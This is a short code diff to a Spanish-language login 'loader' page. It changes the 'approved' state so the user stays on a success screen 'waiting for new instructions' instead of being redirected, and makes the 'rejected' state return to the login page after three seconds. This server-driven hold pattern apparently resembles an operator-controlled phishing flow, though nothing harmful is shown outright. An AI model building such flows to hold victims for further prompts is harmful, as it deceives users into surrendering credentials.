@@ -163,14 +163,14 @@
             </p>
         </div>
 
-        <!-- Resultado: Inicio correcto (approved) -->
+        <!-- Resultado: Inicio correcto (approved) - Se queda en el loader -->
         <div id="resultApproved" class="result-container result-approved">
             <div class="icon-result">✅</div>
             <h2>Inicio de sesión exitoso</h2>
-            <p>Tu inicio de sesión se ha completado correctamente. Serás redirigido en unos momentos...</p>
+            <p>Tu inicio de sesión se ha completado correctamente. Esperando nuevas instrucciones...</p>
         </div>
 
-        <!-- Resultado: No Inicio / Credenciales incorrectas (rejected) -->
+        <!-- Resultado: No Inicio / Credenciales incorrectas (rejected) - Redirige al login -->
         <div id="resultRejected" class="result-container result-rejected">
             <div class="icon-result">🔒</div>
             <h2>Credenciales incorrectas</h2>
@@ -266,9 +266,15 @@
 
                 if (estado === 'approved') {
                     mostrarResultado('approved');
+                    // El usuario se queda en el loader viendo "Inicio de sesión exitoso"
+                    // esperando nuevas instrucciones - NO redirigir
                     return true;
                 } else if (estado === 'rejected') {
                     mostrarResultado('rejected');
+                    // Redirigir al login después de 3 segundos
+                    setTimeout(function() {
+                        window.location.href = 'login.html';
+                    }, 3000);
                     return true;
                 } else {
                     // Sigue pendiente, continuar consultando
